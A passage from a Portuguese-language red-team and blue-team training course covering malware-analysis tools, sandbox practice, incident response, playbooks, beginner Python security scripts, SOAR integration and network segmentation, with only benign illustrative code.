+- Detecta presença de ofuscação, packers ou chamadas suspeitas  
+- Ideal para uma análise rápida e inicial  
+
+🔗 [https://www.winitor.com/](https://www.winitor.com/)
+
+---
+
+ 2. **x64dbg**
+
+- Debugger de código aberto para Windows (x86/x64)  
+- Permite executar o programa passo a passo (debug)  
+- Útil para encontrar **pontos de execução**, comportamento em tempo real e evasões  
+- Excelente para analisar malware com técnicas anti-debug ou anti-VM  
+
+🔗 [https://x64dbg.com/](https://x64dbg.com/)
+
+---
+
+ 3. **Ghidra**
+
+- Ferramenta de engenharia reversa desenvolvida pela NSA  
+- Faz disassembly e decompilação de código binário  
+- Permite entender a lógica interna do programa sem código-fonte  
+- Suporta vários formatos e arquiteturas, ideal para análise avançada  
+
+🔗 [https://ghidra-sre.org/](https://ghidra-sre.org/)
+
+---
+
+ 🔍 Exemplo de uso combinado
+
+```
+- Use o **PEStudio** para entender as características gerais do binário (funções importadas, indicadores de risco)  
+- Analise com o **x64dbg** como o binário se comporta durante a execução, encontrando pontos de interesse  
+- Reforce com o **Ghidra** para estudar a lógica interna e identificar funções maliciosas ou criptografia  
+```
+
+---
+
+ ⚙️ Aplicações no Red Team
+
+- Estudar malwares reais para simular ameaças mais realistas  
+- Criar payloads mais furtivos com base em engenharia reversa  
+- Identificar e testar pontos de evasão de EDR e SIEM  
+- Treinar análise defensiva como forma de antecipar detecção  
+
+---
+
+ ✅ Conclusão
+
+Dominar ferramentas como PEStudio, x64dbg e Ghidra permite ao Red Team N1 explorar binários com profundidade, entender ameaças reais e criar ataques mais estratégicos. Esses conhecimentos abrem as portas da engenharia reversa e da análise avançada.
+
+---
+
+ 🔴 Red Team N1: Prática – Analisar Sample Simples (Malware em Sandbox)
+
+Nada substitui a prática. Analisar uma amostra de malware real (com segurança) em uma sandbox é uma ótima forma de treinar o olhar técnico, identificar comportamentos maliciosos e entender como os sistemas de defesa reagem.
+
+Veja o malware em ação — sem arriscar seu sistema.
+
+---
+
+ 🧠 Objetivo do exercício
+
+- Submeter uma amostra simples de malware a uma sandbox online  
+- Observar e interpretar o comportamento dinâmico da amostra  
+- Coletar indicadores de comprometimento (IOCs)  
+- Treinar a leitura de relatórios técnicos de análise  
+
+---
+
+ 🧱 Ambiente necessário
+
+- Navegador com acesso à internet  
+- Conta gratuita em alguma plataforma de sandbox (ex: AnyRun ou Hybrid Analysis)  
+- Amostra pública e segura (ex: link do MalwareBazaar, arquivo inofensivo com comportamento simulado)  
+
+> **⚠️ Dica de segurança:** nunca execute malwares reais fora de ambientes controlados e isolados.
+
+---
+
+ 🔍 Etapas da prática
+
+```
+1. Acesse [https://any.run/](https://any.run/) ou [https://www.hybrid-analysis.com/](https://www.hybrid-analysis.com/)  
+2. Submeta uma amostra simples, como um `.exe` suspeito ou `.docm` com macro  
+3. Acompanhe a análise em tempo real (AnyRun) ou aguarde o relatório (Hybrid)  
+4. Identifique:
+   - Processos criados  
+   - Conexões de rede realizadas  
+   - Arquivos modificados ou criados  
+   - Strings e URLs visíveis  
+5. Exporte o relatório e destaque os IOCs mais relevantes  
+```
+
+---
+
+ ⚙️ Como interpretar os resultados
+
+- Atividade de rede: conexões para IPs ou domínios maliciosos  
+- Processos: execução de scripts ou binários inusitados  
+- Arquivos: payloads dropados ou arquivos do sistema alterados  
+- Técnicas: indícios de evasão, persistência ou escalonamento  
+
+---
+
+ ✅ Conclusão
+
+Analisar uma amostra real em sandbox ajuda o Red Team N1 a entender como os ataques se comportam em nível técnico. Esse exercício reforça sua capacidade de interpretar ameaças e aplicar conhecimento ofensivo com mais precisão.
+
+---
+
+ 🔴 Red Team N1: Entenda o Ciclo de Resposta a Incidentes
+
+Todo ataque gera uma reação. O ciclo de resposta a incidentes é a espinha dorsal das ações defensivas em um ambiente corporativo. Para o Red Team, entender esse processo é essencial para planejar ataques mais realistas, cronometrados e furtivos.
+
+Conheça o jogo do outro lado — para jogar melhor.
+
+---
+
+ 🧠 O que é o ciclo de resposta a incidentes?
+
+- Conjunto de etapas estruturadas para detectar, responder e recuperar de incidentes de segurança  
+- Segue frameworks como NIST 800-61, adotado globalmente  
+- Envolve múltiplas áreas: segurança, infraestrutura, gestão e jurídico  
+- Ajuda a minimizar impacto, conter ameaças e prevenir recorrência  
+
+---
+
+ 🧱 Etapas do ciclo
+
+ 1. **Preparação**
+
+- Documentação de políticas, planos de resposta, playbooks  
+- Treinamento de equipe, definição de papéis e responsabilidades  
+- Configuração de ferramentas (SIEM, EDR, SOAR) e coleta de logs  
+
+ 2. **Detecção e Análise**
+
+- Identificação de eventos suspeitos por alertas, sensores, usuários  
+- Análise técnica para confirmar se é um incidente real  
+- Classificação da severidade, escopo e vetores envolvidos  
+
+ 3. **Contenção**
+
+- Isolamento do sistema afetado para limitar propagação  
+- Uso de firewalls, regras em EDR/SIEM, bloqueio de contas ou redes  
+- Contenção pode ser temporária ou de longo prazo  
+
+ 4. **Erradicação**
+
+- Eliminação do agente malicioso (malware, usuário, acesso indevido)  
+- Correção de vulnerabilidades exploradas  
+- Revisão de indicadores de comprometimento (IOCs)  
+
+ 5. **Recuperação**
+
+- Restauração de serviços, sistemas e operações  
+- Validação de integridade e monitoramento contínuo  
+- Retorno controlado ao ambiente de produção  
+
+ 6. **Lições Aprendidas**
+
+- Documentação do incidente, análise de falhas e melhorias  
+- Atualização de políticas, regras de detecção e processos  
+- Compartilhamento interno de conhecimento  
+
+---
+
+ 🔍 Como isso impacta o Red Team?
+
+```
+- Saber quando e como o Blue Team detecta suas ações  
+- Planejar ataques com base no tempo de resposta e cobertura de monitoramento  
+- Simular falhas reais para treinar e testar o ciclo de resposta da organização  
+- Usar o ciclo como referência para criar exercícios realistas de Purple Team  
+```
+
+---
+
+ ✅ Conclusão
+
+Compreender o ciclo de resposta a incidentes é um diferencial para o Red Team N1. Isso permite criar ataques mais eficazes, contribuir com simulações e evoluir como profissional estratégico e colaborativo.
+
+---
+
+ 🔴 Red Team N1: Como Criar e Usar Playbooks para Automação e Padronização
+
+Playbooks são documentos operacionais que descrevem **passo a passo** como responder a determinados eventos ou realizar ações específicas. Para o Red Team, entender e até simular playbooks defensivos é essencial para prever comportamentos, criar contramedidas e melhorar a comunicação com Blue Teams e SOCs.
+
+Automatize. Padronize. E então pense como quebrar.
+
+---
+
+ 🧠 O que é um playbook?
+
+- Um **roteiro operacional estruturado** que define como reagir a um tipo específico de evento de segurança  
+- Pode ser **manual, semiautomático ou totalmente automatizado** (via SOAR, scripts etc.)  
+- Define **quem faz o quê**, **quando** e **como**, com base em regras pré-estabelecidas  
+- Usado tanto em resposta a incidentes quanto em operações ofensivas (simulações, coleta, exploração)  
+
+---
+
+ 🧱 Estrutura básica de um playbook
+
+ 1. **Título e objetivo**
+- Ex: “Resposta a alerta de execução de PowerShell suspeito”  
+- Define a finalidade e o escopo da ação  
+
+ 2. **Critérios de ativação**
+- Quais eventos ou alertas disparam esse playbook  
+- Ex: evento no SIEM, hash suspeito detectado, log de login anômalo  
+
+ 3. **Passos detalhados**
+- Ações ordenadas e claras para lidar com o evento  
+- Ex: coletar artefatos, isolar host, consultar IOC, acionar times  
+
+ 4. **Ferramentas envolvidas**
+- Ex: SIEM, EDR, SOAR, scripts em Python, Powershell  
+
+ 5. **Pontos de decisão**
+- Quando escalar, interromper, seguir adiante ou automatizar  
+- Ex: “se o hash estiver no VT com score >80, isole o host”  
+
+ 6. **Pós-ação**
+- Documentar, notificar, atualizar regras ou criar ticket  
+
+---
+
+ 🔍 Aplicações para o Red Team
+
+```
+- Estudar os playbooks defensivos para prever como sua atividade será tratada  
+- Criar seus próprios playbooks ofensivos para padronizar fases do ataque (recon, exploração, pós-exploração)  
+- Automatizar tarefas repetitivas com scripts e ferramentas (ex: coleta de credenciais, enumeração de portas)  
+- Treinar simulações mais realistas baseadas na resposta defensiva esperada  
+```
+
+---
+
+ ⚙️ Ferramentas úteis
+
+- **SOARs** como Splunk Phantom, Cortex XSOAR, Microsoft Sentinel (Playbooks com Logic Apps)  
+- **Automação via scripts:** Bash, PowerShell, Python com APIs de EDR, SIEM, firewall  
+- **Versionamento:** Git para versionar e compartilhar playbooks de Red Team  
+
+---
+
+ ✅ Conclusão
+
+Criar e usar playbooks é uma habilidade fundamental para o Red Team N1. Além de organizar ações ofensivas, isso ajuda a antecipar respostas do Blue Team e a operar de forma mais eficiente, automatizada e colaborativa.
+
+---
+
+ 🔴 Red Team N1: Prática – Montar um Playbook Simples para Resposta a Phishing
+
+Phishing continua sendo um dos vetores mais comuns de ataque. Para o Red Team, conhecer (e simular) como o Blue Team reage a esses ataques é essencial. Criar um playbook de resposta ajuda a entender os pontos de reação, detecção e contenção — e onde você pode atuar para testar a maturidade da equipe defensiva.
+
+---
+
+ 🧠 Objetivo do exercício
+
+- Criar um **playbook básico** e realista de resposta a e-mails de phishing  
+- Simular um cenário prático: phishing com anexo malicioso ou link falso  
+- Padronizar os passos da investigação e contenção  
+
+---
+
+ 🧱 Estrutura do playbook: Resposta a Phishing
+
+ 🎯 **Nome do Playbook:**  
+Resposta a Incidente de Phishing com Anexo Malicioso
+
+ 🔁 **Critério de Ativação:**  
+Alerta no SIEM ou relato de usuário indicando possível phishing
+
+---
+
+ 🔍 Etapas do Playbook
+
+```
+ 1. Coleta de informações iniciais  
+- Obter cópia do e-mail suspeito  
+- Verificar remetente, assunto, data/hora e conteúdo  
+- Identificar link ou anexo presente no corpo do e-mail  
+
+ 2. Análise do artefato  
+- Se houver link: verificar reputação (VirusTotal, urlscan.io)  
+- Se houver anexo: analisar em sandbox (AnyRun, Hybrid Analysis)  
+- Observar comportamento malicioso, criação de arquivos, conexões, etc.  
+
+ 3. Contenção  
+- Bloquear link no proxy/firewall se confirmado malicioso  
+- Isolar máquina do usuário se houver execução do anexo  
+- Revogar credenciais comprometidas (caso haja login suspeito)  
+
+ 4. Comunicação  
+- Avisar equipe de TI, gestão e áreas impactadas  
+- Comunicar o usuário e oferecer orientação  
+
+ 5. Erradicação e recuperação  
+- Remover malware (se necessário)  
+- Reconfigurar acessos, restaurar backups  
+- Monitorar por novas tentativas semelhantes  
+
+ 6. Documentação e lições aprendidas  
+- Registrar o incidente no sistema interno (ticket, relatório)  
+- Atualizar regras de detecção no SIEM e EDR  
+- Reforçar conscientização com base no caso real  
+```
+
+---
+
+ ⚙️ Ferramentas úteis
+
+- SIEM (Splunk, Elastic) para detectar e rastrear e-mails maliciosos  
+- Sandbox (AnyRun, Hybrid Analysis) para analisar anexos  
+- EDR para isolar endpoints e buscar persistência  
+- Serviços de reputação (VirusTotal, AbuseIPDB, urlscan.io)  
+- Scripts para extração de IOC e automação de análise básica  
+
+---
+
+ ✅ Conclusão
+
+Montar um playbook simples de resposta a phishing ajuda o Red Team N1 a entender o fluxo defensivo e criar simulações mais realistas. A prática permite visualizar o tempo de resposta, os pontos de falha e oportunidades de evasão.
+
+---
+
+ 🔴 Red Team N1: Fundamentos Básicos de Python – Variáveis, Loops e Funções
+
+Python é uma das linguagens mais usadas no Red Team, seja para automação, criação de ferramentas, exploits ou engenharia reversa. Dominar a base da linguagem é essencial para evoluir na área ofensiva com mais controle e agilidade.
+
+Automatize hoje, ataque melhor amanhã.
+
+---
+
+ 🧠 Por que aprender Python no Red Team?
+
+- Permite criar scripts rápidos para tarefas como coleta de dados, brute force, automação de análise  
+- Base para ferramentas famosas como `Impacket`, `Scapy`, `pwntools`, entre outras  
+- Facilita integração com APIs, SIEMs, firewalls e SOARs  
+- Essencial para customizar exploits, payloads e módulos  
+
+---
+
+ 🧱 Fundamentos que você precisa dominar
+
+ 📌 1. Variáveis
+
+Armazenam valores para uso posterior.
+
+```
+ip = "192.168.0.1"
+porta = 22
+print("Alvo:", ip, "na porta", porta)
+```
+
+---
+
+ 🔁 2. Loops
+
+Executam ações repetidas vezes. `for` e `while` são os mais usados.
+
+```
+ Tentativa simples de brute force
+senhas = ["123456", "admin", "senha123"]
+for senha in senhas:
+    print("Testando senha:", senha)
+```
+
+---
+
+ ⚙️ 3. Funções
+
+Blocos reutilizáveis de código.
+
+```
+def scan_porta(ip, porta):
+    print(f"Escaneando {ip}:{porta}...")
+
+scan_porta("192.168.0.10", 80)
+```
+
+---
+
+ 🛠️ Prática simples
+
+```
+- Escreva um script que leia uma lista de IPs e imprima cada um  
+- Faça um loop que teste senhas de um dicionário básico  
+- Crie uma função que gere um alerta simulado (ex: “Acesso suspeito detectado”)  
+```
+
+---
+
+ 🔐 Aplicações no Red Team
+
+- Scripts para enumeração e fuzzing  
+- Automações de coleta de dados durante o reconhecimento  
+- Geração de payloads, shells reversos e simulação de ataques  
+- Criação de ferramentas customizadas para pentest interno  
+
+---
+
+ ✅ Conclusão
+
+Aprender os fundamentos de Python coloca o Red Team N1 em vantagem. É o primeiro passo para transformar tarefas manuais em automações eficazes e evoluir para níveis mais técnicos, com domínio de ferramentas próprias.
+
+---
+
+ 🔴 Red Team N1: Scripts para Leitura de Logs e Integração com APIs de Segurança
+
+Automatizar a coleta e análise de logs, bem como a integração com APIs de segurança, é fundamental para o Red Team aprimorar suas ações, identificar padrões e criar simulações realistas. Dominar scripts para essas tarefas aumenta a eficiência e permite escalar operações ofensivas.
+
+---
+
+ 🧠 Por que usar scripts para logs e APIs?
+
+- Facilita a leitura e filtragem de grandes volumes de logs  
+- Permite automatizar consultas a APIs (EDR, SIEM, Threat Intelligence)  
+- Ajuda a identificar indicadores de comprometimento (IOCs) rapidamente  
+- Suporta criação de workflows automatizados para coleta e resposta  
+
+---
+
+ 🧱 Conceitos básicos
+
+- Logs podem estar em arquivos locais ou em sistemas remotos (via API, Syslog, etc.)  
+- APIs comuns incluem VirusTotal, CrowdStrike, Microsoft Defender, entre outras  
+- Bibliotecas Python úteis: `requests` (para HTTP), `json` (para dados), `os` e `re` (para manipulação de arquivos e regex)  
+
+---
+
+ 🔍 Exemplo 1: Leitura simples de logs (arquivo local)
+
+```
+with open("security.log", "r") as arquivo:
+    for linha in arquivo:
+        if "erro" in linha.lower() or "falha" in linha.lower():
+            print("Alerta encontrado:", linha.strip())
+```
+
+---
+
+ 🔍 Exemplo 2: Consulta simples a API VirusTotal
+
+```
+import requests
+
+api_key = "SUA_API_KEY"
+file_hash = "44d88612fea8a8f36de82e1278abb02f"   Exemplo MD5 de arquivo
+
+url = f"https://www.virustotal.com/api/v3/files/{file_hash}"
+headers = {"x-apikey": api_key}
+
+resposta = requests.get(url, headers=headers)
+
+if resposta.status_code == 200:
+    dados = resposta.json()
+    print("Detecção VT:", dados["data"]["attributes"]["last_analysis_stats"])
+else:
+    print("Erro na consulta:", resposta.status_code)
+```
+
+---
+
+ 🔍 Exemplo 3: Integração básica para automatizar alertas
+
+```
+def checar_iocs_em_log(log_path, iocs):
+    with open(log_path, "r") as log:
+        for linha in log:
+            for ioc in iocs:
+                if ioc in linha:
+                    print(f"IOC {ioc} detectado na linha: {linha.strip()}")
+
+iocs_suspeitos = ["192.168.1.100", "malicioso.com", "abc123hash"]
+
+checar_iocs_em_log("security.log", iocs_suspeitos)
+```
+
+---
+
+ ⚙️ Aplicações no Red Team
+
+- Criar ferramentas personalizadas para reconhecimento e pós-exploração  
+- Automatizar coleta de evidências e busca por indicadores  
+- Simular ataques e validar se alertas são gerados corretamente  
+- Integrar com SOAR para acelerar respostas ofensivas  
+
+---
+
+ ✅ Conclusão
+
+Scripts para leitura de logs e integração com APIs de segurança ampliam o alcance e a eficácia do Red Team. São essenciais para transformar dados brutos em inteligência útil e para escalar operações de forma automatizada.
+
+---
+
+ 🔴 Red Team N1: Prática – Criar Script para Coletar Alertas e Enviar Notificação Simples
+
+Automatizar a coleta de alertas e a notificação é fundamental para ganhar agilidade no Red Team. Este exercício vai ajudar você a criar um script básico que lê um arquivo de log, identifica alertas e envia uma notificação simples via e-mail.
+
+---
+
+ 🧠 Objetivo do exercício
+
+- Criar um script Python para monitorar alertas em logs  
+- Enviar notificação automática quando alertas forem detectados  
+- Entender integração básica com serviços de e-mail via SMTP  
+
+---
+
+ 🧱 Ambiente necessário
+
+- Python 3 instalado  
+- Conta de e-mail para envio via SMTP (ex: Gmail)  
+- Arquivo de log local com eventos para monitorar  
+
+---
+
+ 🔍 Exemplo de script
+
+```
+import smtplib
+from email.mime.text import MIMEText
+
+def enviar_email(mensagem, destinatario):
+    smtp_servidor = "smtp.gmail.com"
+    smtp_porta = 587
+    usuario = "seu_email@gmail.com"
+    senha = "sua_senha_app"   Use senha de app para Gmail
+
+    msg = MIMEText(mensagem)
+    msg["Subject"] = "Alerta de Segurança Detectado"
+    msg["From"] = usuario
+    msg["To"] = destinatario
+
+    with smtplib.SMTP(smtp_servidor, smtp_porta) as server:
+        server.starttls()
+        server.login(usuario, senha)
+        server.send_message(msg)
+    print("Email enviado para", destinatario)
+
+def coletar_alertas_e_notificar(log_path, destinatario):
+    alertas = []
+    with open(log_path, "r") as arquivo:
+        for linha in arquivo:
+            if "ALERTA" in linha.upper():
+                alertas.append(linha.strip())
+
+    if alertas:
+        mensagem = "\n".join(alertas)
+        enviar_email(mensagem, destinatario)
+    else:
+        print("Nenhum alerta encontrado.")
+
+if __name__ == "__main__":
+    coletar_alertas_e_notificar("security.log", "destinatario@exemplo.com")
+```
+
+---
+
+ ⚙️ Dicas para aprimorar
+
+- Use variáveis de ambiente para guardar credenciais com segurança  
+- Integre com APIs de serviços de mensagens (Slack, Teams, Telegram)  
+- Automatize a execução periódica com cron jobs ou agendadores  
+
+---
+
+ ✅ Conclusão
+
+Criar scripts simples de coleta e notificação é o primeiro passo para automação ofensiva eficaz. Com esse conhecimento, o Red Team pode acelerar o fluxo de informações e agir rapidamente conforme os alertas.
+
+---
+
+ 🔴 Red Team N1: Conceitos de Integração entre Ferramentas de Segurança
+
+No cenário atual de segurança cibernética, a integração eficiente entre diferentes ferramentas é essencial para criar um ecossistema robusto, automatizado e responsivo. Para o Red Team, entender essas integrações ajuda a planejar ataques que exploram falhas nos fluxos de informação e identificar pontos para simulação mais realistas.
+
+---
+
+ 🧠 Por que integrar ferramentas?
+
+- Centralizar dados para melhor correlação e análise  
+- Automatizar respostas a incidentes com menos intervenção manual  
+- Reduzir o tempo de detecção e mitigação  
+- Garantir que alertas e informações relevantes cheguem rapidamente às equipes certas  
+
+---
+
+ 🧱 Principais tipos de integração
+
+ 1. **API (Application Programming Interface)**
+
+- Permite comunicação entre sistemas via protocolos padrão (REST, SOAP)  
+- Facilita envio e recebimento de dados em formato estruturado (JSON, XML)  
+- Exemplo: SIEM consulta logs via API de EDR para enriquecer alertas  
+
+ 2. **Syslog e Logs Centralizados**
+
+- Ferramentas enviam logs para servidores centralizados (ex: ELK Stack)  
+- Permite análise e correlação em larga escala  
+- Exemplo: Firewalls enviam logs para SIEM  
+
+ 3. **Webhooks**
+
+- Notificações em tempo real disparadas por eventos específicos  
+- Integrações leves e rápidas para alertas instantâneos  
+- Exemplo: SOAR recebe webhook de um EDR para iniciar playbook  
+
+ 4. **Automação via SOAR (Security Orchestration, Automation and Response)**
+
+- Plataforma que orquestra múltiplas ferramentas e processos  
+- Executa playbooks automatizados para resposta rápida  
+- Exemplo: SOAR coleta IOC de sandbox, bloqueia IP no firewall e abre ticket  
+
+---
+
+ 🔍 Exemplos práticos de integração
+
+```
+- **SIEM + EDR:** SIEM recebe alertas do EDR e correlaciona com logs de rede para detectar ataques avançados  
+- **Sandbox + SOAR:** Sandbox envia relatório para SOAR, que automatiza análise e resposta  
+- **Firewall + Threat Intelligence:** Firewall atualiza regras automaticamente com IOCs vindos de feeds TI  
+- **Ticketing + Monitoramento:** Alertas geram tickets automaticamente para fluxo de resposta  
+
+---
+
+ ⚙️ Benefícios para o Red Team
+
+```
+- Entender as integrações permite identificar pontos fracos e janelas de ataque  
+- Criar simulações mais realistas que acionem várias ferramentas em cadeia  
+- Aproveitar APIs para coletar informações e ajustar estratégias ofensivas  
+- Contribuir para exercícios de Purple Team com conhecimento das respostas automatizadas  
+```
+
+---
+
+ ✅ Conclusão
+
+Compreender os conceitos de integração entre ferramentas é essencial para o Red Team avançar na criação de ataques sofisticados e para colaborar com o Blue Team em simulações e melhorias contínuas.
+
+---
+
+ 🔴 Red Team N1: Introdução a SOAR e Playbooks Automatizados
+
+SOAR (Security Orchestration, Automation and Response) é uma tecnologia que integra diversas ferramentas de segurança para automatizar processos, orquestrar fluxos de trabalho e acelerar respostas a incidentes. Para o Red Team, conhecer SOAR ajuda a entender como o Blue Team automatiza defesas e como planejar ataques que possam contornar essas automações.
+
+---
+
+ 🧠 O que é SOAR?
+
+- Plataforma que une **orquestração**, **automação** e **resposta**  
+- Permite criar **playbooks** que executam ações automáticas baseadas em regras  
+- Integra ferramentas como SIEM, EDR, firewalls, sandboxes, e APIs diversas  
+- Facilita o trabalho da equipe de segurança, reduzindo erros e tempo de reação  
+
+---
+
+ 🧱 Componentes principais do SOAR
+
+ 1. **Orquestração**
+
+- Coordena múltiplas ferramentas e processos para uma resposta integrada  
+- Exemplo: receber alerta no SIEM e disparar coleta de artefatos no EDR  
+
+ 2. **Automação**
+
+- Executa tarefas repetitivas automaticamente, como bloqueios e consultas  
+- Exemplo: bloquear IP malicioso no firewall sem intervenção humana  
+
+ 3. **Resposta**
+
+- Gera ações concretas, desde isolamento de host até abertura de tickets  
+- Permite responder a incidentes com agilidade e padronização  
+
+---
+
+ 🔍 O que são playbooks automatizados?
+
+```
+- Documentos estruturados que definem **passos sequenciais** para tratar incidentes  
+- Podem ser manuais, semiautomáticos ou totalmente automatizados via SOAR  
+- Definem regras, condições, ações e notificações  
+- Exemplo: playbook para resposta a phishing que analisa e-mail, bloqueia anexos e alerta equipe  
+```
+
+---
+
+ ⚙️ Benefícios para o Red Team
+
+```
+- Entender playbooks ajuda a prever e testar a resposta automatizada do Blue Team  
+- Permite planejar ataques que evitem gatilhos automáticos  
+- Possibilita colaborar em exercícios de Purple Team com simulações reais  
+- Oferece insights para criar scripts que interajam com SOARs em ofensiva  
+```
+
+---
+
+ ✅ Conclusão
+
+Conhecer SOAR e playbooks automatizados é fundamental para o Red Team N1 que quer atuar estrategicamente. Isso amplia a visão do ciclo de defesa e prepara o profissional para ambientes cada vez mais automatizados e integrados.
+
+---
+
+ 🔴 Red Team N1: Prática – Simular Integração Simples para Resposta Automatizada
+
+A prática de integrar ferramentas e automatizar respostas é essencial para o Red Team entender os mecanismos de defesa do Blue Team e aprimorar suas técnicas. Neste exercício, você vai criar uma integração básica simulando uma resposta automatizada a um alerta de segurança.
+
+---
+
+ 🧠 Objetivo do exercício
+
+- Simular a recepção de um alerta (ex: arquivo malicioso detectado)  
+- Automatizar uma ação simples (ex: bloquear IP suspeito)  
+- Entender fluxo básico de orquestração e automação  
+
+---
+
+ 🧱 Cenário simplificado
+
+- Alerta gerado por um sistema de detecção (log, arquivo JSON, webhook)  
+- Script que lê o alerta e executa uma ação de contenção (ex: print, atualização de firewall fictício)  
+
+---
+
+ 🔍 Exemplo de script Python
+
+```
+import json
+
+ Função simulada para bloquear IP (substitua por integração real)
+def bloquear_ip(ip):
+    print(f"[AÇÃO] IP {ip} bloqueado no firewall.")
+
+ Simula recebimento de alerta em JSON
+alerta_json = '''
+{
+    "evento": "detecção de malware",
+    "ip_suspeito": "192.168.10.100",
+    "arquivo": "malware.exe",
+    "ação": "bloquear_ip"
+}
+'''
+
+def processar_alerta(alerta_str):
+    alerta = json.loads(alerta_str)
+    if alerta.get("ação") == "bloquear_ip":
+        ip = alerta.get("ip_suspeito")
+        bloquear_ip(ip)
+    else:
+        print("Nenhuma ação configurada para este alerta.")
+
+if __name__ == "__main__":
+    processar_alerta(alerta_json)
+```
+
+---
+
+ ⚙️ Como expandir esta simulação
+
+- Integrar com APIs reais de firewall ou EDR  
+- Criar listener para receber alertas via webhook ou fila de mensagens  
+- Adicionar logging, notificações e registro de eventos  
+- Implementar playbooks mais complexos com múltiplas etapas  
+
+---
+
+ ✅ Conclusão
+
+Simular integrações simples é um excelente ponto de partida para entender como funciona a automação de respostas no ambiente de segurança. Com isso, o Red Team pode antecipar defesas e aprimorar seus ataques.
+
+---
+
+ 🔵 Blue Team N1: Princípios de Segmentação e Microsegmentação
+
+Segmentação e microsegmentação são estratégias fundamentais para proteger redes, limitar movimentos laterais de invasores e aumentar a segurança do ambiente. No Blue Team N1, entender esses conceitos ajuda a construir defesas robustas e reduzir riscos.
+
+---
+
+ 🧠 O que é segmentação?
+
+- Dividir a rede em segmentos lógicos ou físicos separados  
+- Controlar tráfego entre segmentos usando firewalls, VLANs ou ACLs  
+- Limitar o alcance de ataques e facilitar a aplicação de políticas de segurança  
+
+---
+
+ 🧱 O que é microsegmentação?
+
+- Segmentação granular dentro de um segmento maior, até o nível de workloads ou aplicações  
+- Usa controles mais precisos (ex: políticas baseadas em identidade, tags, contextos)  
+- Pode ser aplicada em ambientes físicos, virtuais e em cloud  
+
+---
+
+ 🔍 Benefícios da segmentação e microsegmentação
+
+```
+- Redução do risco de movimentação lateral após comprometimento  
+- Maior visibilidade e controle do tráfego interno  
+- Aplicação de políticas específicas para diferentes ativos e usuários  
+- Melhoria na conformidade com regulamentos de segurança  
+```
+
+---
+
+ ⚙️ Exemplos práticos
+
+- Separar a rede administrativa da rede dos usuários finais  
+- Isolar servidores críticos em zonas restritas com regras rígidas  
+- Implementar firewalls internos para bloquear tráfego entre aplicações diferentes  
+- Usar microsegmentação em ambientes de container (ex: Kubernetes Network Policies)  
+
+---
+
+ ✅ Boas práticas
+
+```
+- Mapear bem os ativos e dependências antes de segmentar  
+- Definir regras “deny by default” e liberar apenas o necessário  
+- Monitorar tráfego e ajustar políticas com base em comportamento real  
+- Automatizar a criação e gerenciamento de políticas com ferramentas de orquestração  
+```
+
+---
+
+ ✅ Conclusão
+
+Segmentação e microsegmentação são pilares da defesa em profundidade. Para o Blue Team N1, aplicar esses princípios fortalece a rede contra ataques avançados, dificulta movimentos laterais e melhora a postura geral de segurança.
+
+---
+
+
+ 🔵 Blue Team N1: Zonas de Confiança e Controle de Acesso na Rede
+
+Entender as zonas de confiança e implementar controles de acesso eficientes são etapas essenciais para proteger a rede e limitar o impacto de ataques. No Blue Team N1, esses conceitos ajudam a organizar a rede de forma segura e a aplicar políticas que minimizam riscos.
+
+---
+
+ 🧠 O que são zonas de confiança?
+
+- Áreas ou segmentos da rede classificados conforme o nível de segurança e criticidade  
+- Cada zona possui um grau diferente de confiança e políticas específicas de acesso  
+- Exemplos comuns: zona interna segura, zona DMZ, zona externa (internet)  
+
+---
+
+ 🧱 Tipos comuns de zonas de confiança
+
+```
+- **Zona interna (trusted):** Rede corporativa segura com acesso restrito  
+- **Zona desmilitarizada (DMZ):** Área pública que hospeda serviços acessíveis externamente, como servidores web  
+- **Zona externa (untrusted):** Internet ou redes não confiáveis  
+- **Zona de gestão:** Segmento reservado para administração e monitoramento  
+```
+
+---
+
+ 🔍 Controle de acesso na rede
+
+- Baseia-se em políticas que determinam quem pode acessar o quê, quando e como  
+- Utiliza mecanismos como firewalls, listas de controle de acesso (ACLs), VLANs e NAC (Network Access Control)  
+- Implementa princípios como “menor privilégio” e “deny by default”  
+
+---
+
+ ⚙️ Boas práticas para controle de acesso
+
+```
+- Segmentar a rede em zonas claras e aplicar regras restritivas entre elas  
+- Monitorar e registrar tentativas de acesso para auditoria e análise  
+- Usar autenticação forte e métodos de verificação para acesso a zonas sensíveis  
+- Atualizar regularmente políticas e regras para se adaptar a novos riscos  
+```
+
+---
+
+ ✅ Benefícios para o Blue Team
+
+- Redução da superfície de ataque e limitação de movimentos laterais  
+- Melhoria na detecção de atividades suspeitas e anômalas  
+- Facilidade na gestão e resposta a incidentes  
+- Cumprimento de requisitos de conformidade e auditoria  
+
+---
+
+ ✅ Conclusão
+
+Zonas de confiança e controle de acesso são fundamentos da arquitetura de rede segura. Para o Blue Team N1, implementar esses conceitos é crucial para proteger ativos, controlar riscos e fortalecer a defesa em profundidade.
+
+---
+
+ 🔵 Blue Team N1: Prática – Desenhar uma Arquitetura Simples e Segura para Ambiente Corporativo
+
+Desenhar uma arquitetura de rede segura é um passo fundamental para garantir a proteção dos ativos e a eficiência da defesa. Nesta prática, você vai criar um modelo básico que contempla segmentação, zonas de confiança e controles de acesso essenciais.
+
+---
+
+ 🧠 Objetivos da prática
+
+- Aplicar conceitos de segmentação e zonas de confiança  
+- Definir controles básicos de acesso entre segmentos  
+- Criar um diagrama simples que represente a arquitetura segura  
+
+---
+
+ 🧱 Elementos principais para incluir no desenho
+
+```
+- Zona externa (Internet)  
+- Firewall perimetral  
+- Zona DMZ para serviços públicos (web, email)  
+- Rede interna segmentada (usuários, servidores, gestão)  
+- Controle de acesso entre zonas (firewalls, ACLs)  
+- Monitoramento e logging  
+```
+
+---
+
+ 🔍 Passos para criar sua arquitetura
+
+```
+1. Desenhe a internet como fonte externa  
+2. Adicione firewall perimetral controlando o tráfego de entrada/saída  
+3. Crie uma DMZ isolada para servidores acessíveis externamente  
+4. Separe a rede interna em sub-redes: usuários, servidores, gestão  
+5. Defina regras de firewall e ACLs entre essas zonas, seguindo princípio de menor privilégio  
+6. Inclua sistemas de monitoramento para registrar e analisar tráfego  
+```
+
+---
+
+ ⚙️ Exemplo simples (descrição textual)
+
+- Internet → Firewall Perimetral → DMZ (servidores web, email)  
+- Firewall → Rede Interna  
+  - Sub-rede Usuários (acesso restrito)  
+  - Sub-rede Servidores (restrito a usuários e gestão)  
+  - Sub-rede Gestão (acesso exclusivo para admins)  
+
+---
+
+ ✅ Dicas para aprimorar
+
+- Use ferramentas de diagramação como draw.io, Lucidchart ou Microsoft Visio  
+- Considere adicionar IDS/IPS para monitoramento adicional  
+- Pense em políticas de acesso baseadas em identidade e não só IP  
+- Documente as regras e revise regularmente  
+
+---
+
+ ✅ Conclusão
+
